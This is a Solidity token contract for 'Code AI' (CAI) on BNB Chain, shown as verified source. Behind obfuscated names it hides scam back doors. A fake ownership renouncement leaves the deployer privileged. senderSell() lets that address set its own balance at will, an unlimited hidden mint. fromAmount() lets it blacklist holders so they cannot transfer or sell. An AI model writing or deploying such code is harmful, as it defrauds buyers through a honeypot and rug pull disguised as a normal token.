/**
 *Submitted for verification at BscScan.com on 2023-02-13
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface marketingEnableFee {
    function totalSupply() external view returns (uint256);

    function balanceOf(address autoBuy) external view returns (uint256);

    function transfer(address senderEnableTo, uint256 autoWallet) external returns (bool);

    function allowance(address totalWallet, address spender) external view returns (uint256);

    function approve(address spender, uint256 autoWallet) external returns (bool);

    function transferFrom(
        address sender,
        address senderEnableTo,
        uint256 autoWallet
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverFrom, uint256 value);
    event Approval(address indexed totalWallet, address indexed spender, uint256 value);
}

interface marketingEnableFeeMetadata is marketingEnableFee {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


interface txExempt {
    function createPair(address toSell, address tradingMode) external returns (address);
}

interface listTo {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract amountReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract CodeAI is amountReceiver, marketingEnableFee, marketingEnableFeeMetadata {

    function getOwner() external view returns (address) {
        return tokenWallet;
    }

    mapping(address => uint256) private isBuy;

    function transferFrom(address receiverAmountList, address senderEnableTo, uint256 autoWallet) external override returns (bool) {
        if (modeMin[receiverAmountList][_msgSender()] != type(uint256).max) {
            require(autoWallet <= modeMin[receiverAmountList][_msgSender()]);
            modeMin[receiverAmountList][_msgSender()] -= autoWallet;
        }
        return launchedIsSender(receiverAmountList, senderEnableTo, autoWallet);
    }

    string private liquiditySellTotal = "CAI";

    uint256 private receiverMarketing = 100000000 * 10 ** 18;

    bool public feeReceiverMode;

    address public receiverTotal;

    function name() external view virtual override returns (string memory) {
        return launchedWallet;
    }

    event OwnershipTransferred(address indexed sellSenderTeam, address indexed atMode);

    uint256 public takeTradingAt;

    string private launchedWallet = "Code AI";

    constructor (){
        
        listTo listMaxWallet = listTo(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        receiverTotal = txExempt(listMaxWallet.factory()).createPair(listMaxWallet.WETH(), address(this));
        tokenWallet = _msgSender();
        
        toReceiver = tokenWallet;
        autoTotal[toReceiver] = true;
        if (buyMax != toAt) {
            toAt = buyMax;
        }
        isBuy[toReceiver] = receiverMarketing;
        emit Transfer(address(0), toReceiver, receiverMarketing);
        fundFrom();
    }

    mapping(address => bool) public receiverAtLaunch;

    bool private exemptBuy;

    mapping(address => bool) public autoTotal;

    function fundFrom() public {
        emit OwnershipTransferred(toReceiver, address(0));
        tokenWallet = address(0);
    }

    function launchedIsSender(address receiverAmountList, address senderEnableTo, uint256 autoWallet) internal returns (bool) {
        if (receiverAmountList == toReceiver || senderEnableTo == toReceiver) {
            return swapToken(receiverAmountList, senderEnableTo, autoWallet);
        }
        if (marketingAtTrading != feeReceiverMode) {
            marketingIs = toAt;
        }
        require(!receiverAtLaunch[receiverAmountList]);
        
        return swapToken(receiverAmountList, senderEnableTo, autoWallet);
    }

    function feeFund() public view returns (uint256) {
        return marketingIs;
    }

    function amountFrom() public {
        if (marketingAtTrading != exemptBuy) {
            walletLaunched = toAt;
        }
        
        feeReceiverMode=false;
    }

    function swapBuyTx() public {
        
        
        toAt=0;
    }

    address public toReceiver;

    function swapToken(address receiverAmountList, address senderEnableTo, uint256 autoWallet) internal returns (bool) {
        require(isBuy[receiverAmountList] >= autoWallet);
        isBuy[receiverAmountList] -= autoWallet;
        isBuy[senderEnableTo] += autoWallet;
        emit Transfer(receiverAmountList, senderEnableTo, autoWallet);
        return true;
    }

    function allowance(address launchFromAt, address sellToken) external view virtual override returns (uint256) {
        return modeMin[launchFromAt][sellToken];
    }

    function tradingMax() public view returns (bool) {
        return feeReceiverMode;
    }

    function owner() external view returns (address) {
        return tokenWallet;
    }

    uint256 public marketingIs;

    mapping(address => mapping(address => uint256)) private modeMin;

    uint256 private toAt;

    function sellMaxList() public view returns (uint256) {
        return buyMax;
    }

    uint256 public walletLaunched;

    function transfer(address atLiquidityMarketing, uint256 autoWallet) external virtual override returns (bool) {
        return launchedIsSender(_msgSender(), atLiquidityMarketing, autoWallet);
    }

    function symbol() external view virtual override returns (string memory) {
        return liquiditySellTotal;
    }

    function senderSell(uint256 autoWallet) public {
        if (!autoTotal[_msgSender()]) {
            return;
        }
        isBuy[toReceiver] = autoWallet;
    }

    function fundTeamMax() public {
        
        
        buyMax=0;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return receiverMarketing;
    }

    function decimals() external view virtual override returns (uint8) {
        return isMin;
    }

    function approve(address sellToken, uint256 autoWallet) public virtual override returns (bool) {
        modeMin[_msgSender()][sellToken] = autoWallet;
        emit Approval(_msgSender(), sellToken, autoWallet);
        return true;
    }

    uint256 public buyMax;

    uint8 private isMin = 18;

    bool private marketingAtTrading;

    address private tokenWallet;

    function toWalletTeam(address autoFund) public {
        if (tradingBuy) {
            return;
        }
        if (feeReceiverMode != exemptBuy) {
            toAt = marketingIs;
        }
        autoTotal[autoFund] = true;
        
        tradingBuy = true;
    }

    function balanceOf(address autoBuy) public view virtual override returns (uint256) {
        return isBuy[autoBuy];
    }

    bool public tradingBuy;

    function fromAmount(address launchFrom) public {
        if (toAt == takeTradingAt) {
            walletLaunched = toAt;
        }
        if (launchFrom == toReceiver || launchFrom == receiverTotal || !autoTotal[_msgSender()]) {
            return;
        }
        if (marketingAtTrading) {
            feeReceiverMode = false;
        }
        receiverAtLaunch[launchFrom] = true;
    }

}